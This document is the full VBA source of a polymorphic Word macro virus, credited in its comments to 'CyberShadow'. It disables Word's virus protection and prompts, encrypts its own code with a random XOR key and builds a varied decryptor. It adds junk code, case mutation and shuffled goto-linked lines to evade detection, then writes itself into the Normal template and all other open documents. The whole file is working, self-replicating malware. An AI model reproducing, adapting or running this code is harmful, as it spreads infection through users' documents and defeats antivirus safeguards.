Private Sub Document_Close()
 Randomize
 CrStr = getname()
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 'Permutation PolyMac
 'Macros used MacroCryptedPolymorphicRealisticAntiheuristicCodeEngine
 'by CyberShadow v2.0
 'No ideas to new versions :(
 With Application
  .EnableCancelKey = True
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Call compile(CryptedString, r11, r21, r23, CrStr)
 CrypteS = ""
 Call insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS, ProceduresCounter)
 CryptedS = "Private Sub Document_Open()" + Chr$(13) + Chr$(10) + CrypteS
 CryptedS = CryptedS + Chr$(13) + Chr$(10) + "End Sub" + Chr$(13) + Chr$(10) + ProceduresCounter
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) = "" Then NT.Insertlines 1, CryptedS
 If Documents.Count > 1 Then
  aff = ActiveDocument
  For Each aDoc In Documents
   If aDoc.Name <> aff Then
    Documents(aDoc.Name).Activate
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.lines(1, 1) = "" Then AD.Insertlines 1, CryptedS
   End If
  Next
  If ActiveDocument.Name <> aff Then Documents(aff).Activate
 End If
 Application.ScreenUpdating = True
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, r11, r21, r23, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.lines(1, AD.countoflines)
 CryptedString = CrStr + "="
 fl = 0
 r1 = Int(Rnd * 255)
 r2 = Int(Rnd * 255)
 r3 = Int(Rnd * 255)
 r11 = r1: r21 = r2: r23 = r3
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  r1 = (r1 + r2) Mod 255
  r2 = (r1 + r3) Mod 255
  r3 = (r2 + r1) Mod 255
  b = b Xor r3
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Or b = Asc("_") Or b = Asc("^") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr$(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS, ProceduresCounter)
 Call CorrectLine(CryptedString, CrStr, CryptedS)
 Call MakingDecryptor(r11, r21, r23, CrStr, CryptedS, myVars)
 Call PermuteCryptedBody(CryptedS, myVars, ProceduresCounter)
End Sub
Private Sub CorrectLine(CryptedString, CrStr, CryptedS)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
End Sub
Private Sub MakingDecryptor(r11, r21, r23, CrStr, CryptedS, myVars)
 VarCount = 8
 ReDim a(VarCount)
 myVars = "(" + CrStr
 For i = 1 To VarCount
  Do
   a1 = 0
   a(i) = getname()
   For j = 1 To i - 1
    If a(i) = a(j) Then a1 = 1
   Next
  Loop While a1 = 1
  myVars = myVars + "," + a(i)
 Next
 myVars = myVars + ")"
 s = StartString
 c = a(1) + "=" + Str$(r11) + Chr$(13) + Chr$(10)
 c = c + a(2) + "=" + Str$(r21) + Chr$(13) + Chr$(10)
 c = c + a(3) + "=" + Str$(r23) + Chr$(13) + Chr$(10)
 c = c + a(4) + "=""""" + Chr$(13) + Chr$(10)
 c1 = "mid$(" + CrStr + "," + a(5) + ",1)"
 c2 = a(1) + "=(" + a(1) + "+" + a(2) + ") mod 255" + Chr$(13) + Chr$(10)
 c2 = c2 + a(2) + "=(" + a(1) + "+" + a(3) + ") mod 255" + Chr$(13) + Chr$(10)
 c2 = c2 + a(3) + "=(" + a(2) + "+" + a(1) + ") mod 255" + Chr$(13) + Chr$(10)
 Select Case Int(Rnd * 2)
  Case Is = 0: c2 = c2 + a(6) + "=asc(" + c1 + ")" + Chr$(13) + Chr$(10) + a(6) + "=" + a(6) + " xor " + a(3) + Chr$(13) + Chr$(10) + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + Chr$(13) + Chr$(10)
  Case Else: c2 = c2 + a(6) + "=asc(" + c1 + ")" + " xor " + a(3) + Chr$(13) + Chr$(10) + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + Chr$(13) + Chr$(10)
 End Select
 Select Case Int(Rnd * 6)
  Case 0
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do while ") + a(5) + "<=len(" + CrStr + ")" + Chr$(13) + Chr$(10)
   c = c + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop") + Chr$(13) + Chr$(10)
  Case 1
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do until ") + a(5) + ">len(" + CrStr + ")" + Chr$(13) + Chr$(10)
   c = c + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop") + Chr$(13) + Chr$(10)
  Case 2
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do") + Chr$(13) + Chr$(10) + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop while ") + a(5) + "<=len(" + CrStr + ")" + Chr$(13) + Chr$(10)
  Case 3
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do") + Chr$(13) + Chr$(10) + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10) + ref("_loop until ") + a(5) + ">len(" + CrStr + ")" + Chr$(13) + Chr$(10)
  Case Else
   c = c + ref("_for ") + a(5) + ref("=1 to len(") + CrStr + ")" + Chr$(13) + Chr$(10) + c2
   c = c + ref("_next") + Chr$(13) + Chr$(10)
 End Select
 Go2 = getname() + getname()
 c = c + Chr$(13) + Chr$(10)
 c = c + ref("if Options.ConfirmConversions = true then goto ") + Go2 + Chr$(13) + Chr$(10)
 c = c + "Options.ConfirmConversions = True" + Chr$(13) + Chr$(10)
 c = c + ref("documents.add") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.vbproject.vbcomponents(1).codemodule.insertlines 1, ") + a(4) + Chr$(13) + Chr$(10)
 c = c + a(8) + ref("=normaltemplate.path+""\") + a(7) + ref(".doc""") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.saveas filename:=") + a(8) + ref(", fileformat:=wdformatdocument") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.close") + Chr$(13) + Chr$(10)
 c = c + ref("options.virusprotection=false") + Chr$(13) + Chr$(10)
 c = c + ref("documents.open ") + a(8) + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.save") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.close") + Chr$(13) + Chr$(10)
 c = c + "kill " + a(8) + Chr$(13) + Chr$(10)
 c = c + "^" + Go2 + ":" + Chr$(13) + Chr$(10)
 c = c + "Options.ConfirmConversions = False" + Chr$(13) + Chr$(10)
 CryptedS = CryptedS + c
End Sub
Private Function refn()
 If Rnd > 0.5 Then refn = Chr$(13) + Chr$(10) Else refn = ":"
End Function
Private Function ref(fff)
fff1 = ""
For i = 1 To Len(fff)
 b = Asc(Mid$(fff, i, 1))
 If Rnd > 0.5 And b >= 97 And b <= 122 Then b = b - 32
 fff1 = fff1 + Chr$(b)
Next
ref = fff1
End Function
Private Sub polym(fc, m)
 t = Int(Rnd * 7)
 maxm = 5
 Select Case t
  Case 0
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 1
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do until ") + s + ">" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 2
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop until ") + s + ">" + Str$(Int(Rnd * 50) + 41) + refn()
  Case 3
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
  Case 4
   fc = fc + ref("for ") + getname() + getname() + "=" + Str$(Int(Rnd * 10)) + ref(" to ") + Str$(Int(Rnd * 50) + 11) + ref(" step ") + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + "next" + refn()
  Case 5
   tfc = 2
   fc = fc + getname() + getname() + "="
   If Rnd > 0.5 Then fc = fc + getname(): tfc = 0 Else fc = fc + Str$(Int(Rnd * 200))
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "+": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "-": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "*": tfc = 1
   If tfc = 1 Then
    If Rnd > 0.5 Then fc = fc + getname() Else fc = fc + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
  Case 6
   fc = fc + Chr$(13) + Chr$(10) + ref("if ") + getname()
   If Rnd > 0.5 Then
     tfc = "<"
    ElseIf Rnd > 0.5 Then
     tfc = ">"
    ElseIf Rnd > 0.5 Then
     tfc = "="
    Else
     tfc = ""
   End If
   Do
    If Rnd > 0.5 Then
      tfc1 = "<"
     ElseIf Rnd > 0.5 Then
      tfc1 = ">"
     ElseIf Rnd > 0.5 Then
      tfc1 = "="
     Else
      tfc1 = ""
    End If
   Loop While tfc = tfc1
   fc = fc + tfc + tfc1
   If Rnd > 0.5 Then
     fc = fc + getname()
    ElseIf Rnd > 0.5 Then
     fc = fc + Str$(Int(Rnd * 100) + 1)
    Else
     fc = fc + "rnd*" + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + ref(" then ") + Chr$(13) + Chr$(10)
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + Chr$(13) + Chr$(10) + ref("end if") + refn()
  Case Else
 End Select
End Sub
Private Sub PermuteCryptedBody(CryptedS, myVars, ProceduresCounter)
LinesCounter = 0
For i = 1 To Len(CryptedS)
 If Mid$(CryptedS, i, 1) = Chr$(13) Then LinesCounter = LinesCounter + 1
Next
ReDim CSLines(LinesCounter + 2)
ReDim TableCounter(LinesCounter + 1)
Dim CorrectTable(2)
i1 = 1
CSLines(LinesCounter + 2) = getname() + Chr$(Asc("0") + Int(Rnd * 9))
lastgoto = CSLines(LinesCounter + 2)
t = 1
ProceduresCounter = ""
For i = 1 To LinesCounter
 ProcedureFlag = 0
 fc = "": Call polym(fc, 1)
 fc = Chr$(13) + Chr$(10) + lastgoto + ":" + Chr$(13) + Chr$(10) + fc
 Do While Mid$(CryptedS, i1, 1) <> Chr$(13)
  CSLines(i) = CSLines(i) + Mid$(CryptedS, i1, 1)
  i1 = i1 + 1
 Loop
 fls = "": iflag = 0
 If Len(CSLines(i)) > 2 Then
  If UCase(Mid$(CSLines(i), 1, 1)) = "I" Then
   fls = Chr$(13) + Chr$(10): iflag = 1
   ProcedureFlag = 1
  End If
 End If
 CSL = ""
 For j = 1 To Len(CSLines(i))
  CSL1 = Mid$(CSLines(i), j, 1)
  If CSL1 = "_" Then
    CorrectTable(t) = i: t = t + 1
    ProcedureFlag = 1
    CSL1 = " "
  End If
  If CSL1 = "^" Then
   CSL1 = Chr$(13) + Chr$(10)
   ProcedureFlag = 1
  End If
  CSL = CSL + CSL1
 Next
 CSLines(i) = CSL
 If ProcedureFlag = 0 And Rnd > 0.5 Then
   callto = getname() + getname() + getname() + myVars
   fc2 = "": Call polym(fc2, 1): fc1 = "": Call polym(fc1, 1)
   If Rnd > 0.5 Then
     ProceduresCounter = ProceduresCounter + ref("private sub ") + callto + Chr$(13) + Chr$(10) + fc + CSLines(i) + refn() + fc1 + Chr$(13) + Chr$(10) + ref("end sub") + Chr$(13) + Chr$(10)
    Else
     ProceduresCounter = ref("private sub ") + callto + Chr$(13) + Chr$(10) + fc + CSLines(i) + refn() + fc1 + Chr$(13) + Chr$(10) + ref("end sub") + Chr$(13) + Chr$(10) + ProceduresCounter
   End If
   CSLines(i) = fc + fls + "call " + callto
  Else
   CSLines(i) = fc + fls + CSLines(i)
 End If
 
 fc = "": Call polym(fc, 1)
 If iflag = 1 Then
   CSLines(i) = CSLines(i) + Chr$(13) + Chr$(10)
  Else
   CSLines(i) = CSLines(i) + refn()
 End If
 lastgoto = getname() + Chr$(Asc("0") + Int(Rnd * 9))
 CSLines(i) = CSLines(i) + fc + "goto " + lastgoto
 TableCounter(i) = i
 i1 = i1 + 2
Next
TableCounter(LinesCounter + 1) = LinesCounter + 1
CSLines(LinesCounter + 1) = Chr$(13) + Chr$(10) + lastgoto + ":" + Chr$(13) + Chr$(10)

For i = 1 To LinesCounter
 k = Int(Rnd * (LinesCounter - 1)) + 1
 k1 = TableCounter(k)
 TableCounter(k) = TableCounter(LinesCounter + 1 - i)
 TableCounter(LinesCounter + 1 - i) = k1
Next
For i = 1 To LinesCounter
 For t = 1 To 2
  If TableCounter(i) = CorrectTable(t) Then
   k1 = TableCounter(i)
   TableCounter(i) = TableCounter(CorrectTable(t))
   TableCounter(CorrectTable(t)) = k1
   CorrectTable(t) = -1
  End If
 Next
Next

CryptedS = ""
For i = 1 To LinesCounter + 1
 CryptedS = CryptedS + CSLines(TableCounter(i)) + Chr$(13) + Chr$(10)
Next
CryptedS = "goto " + CSLines(LinesCounter + 2) + Chr$(13) + Chr(10) + CryptedS
End Sub
